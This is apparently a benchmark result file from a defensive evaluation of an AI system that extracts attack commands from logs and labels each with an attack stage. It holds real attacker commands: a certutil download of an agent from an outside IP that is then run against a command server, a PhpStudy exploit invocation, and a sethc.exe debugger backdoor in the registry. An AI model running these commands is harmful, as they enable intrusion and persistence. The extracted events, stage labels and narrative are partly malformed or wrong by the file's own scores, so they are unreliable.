@@ -1,0 +1,114 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "taskkill /f /im agent.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.224.153.87:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Collection"
+      },
+      {
+        "command": "del /f /q PhpStudyPoc.py",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"echo start:f98e6367-e38b-4e53-ba83-c58ede5c85fc\"",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"cmd /c 'python PhpStudyExp2.py http://121.36.30.176/ \"whoami&arp -a&ipconfig&ping www.baidu.com -c 1\"'",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"echo end:f98e6367-e38b-4e53-ba83-c58ede5c85fc\"",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"cmd /c 'python PhpStudyExp2.py http://121.36.30.176/ \"taskkill /f /im agent.exe&certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe&cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"echo end:f98e6367-e38b-4e53-ba83-c58ede5c85fc\"",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"echo start:dbb2f234-101f-4f44-bb97-72263635f506\"",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe \\value Debugger \\type REG_SZ \\data C:\\windows\\system32\\cmd.exe\\\\\", ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C ",
+        "stage": "Persistence"
+      },
+      {
+        "command": "\\cmd.exe /c \\",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe /v Debugger /t REG_SZ /d C:\\windows\\system32\\cmd.exe\\\\f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe /v Debugger /t REG_SZ /d C:\\windows\\system32\\sethc.exe\\\\f\"",
+        "stage": "Persistence"
+      }
+    ],
+    "narrative": "The attacker started an initial access using Chrome browser to download malware onto the victim's machine. They used various tools such as Python scripts to move laterally within the network and collect information. The attackers also created new accounts, added them to admin groups, and deleted existing accounts. Furthermore, they modified registry settings allowing themselves additional privileges. Lastly, the attackers installed additional services that were likely used for future lateral movement.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 67449,
+      "completion_tokens": 1967,
+      "total_tokens": 69416,
+      "wall_clock_s": 15.096,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.4375,
+      "recall": 0.7,
+      "f1": 0.5384615384615384,
+      "tp": 7,
+      "fp": 9,
+      "fn": 3
+    },
+    "stage": {
+      "precision": 0.0625,
+      "recall": 0.16666666666666666,
+      "f1": 0.09090909090909091,
+      "tp": 1,
+      "fp": 15,
+      "fn": 5,
+      "recall_partial": 0.3333333333333333
+    },
+    "hallucination_rate": 0.09090909090909091,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 67449,
+      "completion_tokens": 1967,
+      "total_tokens": 69416,
+      "wall_clock_s": 15.096,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v3_stagedefs",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
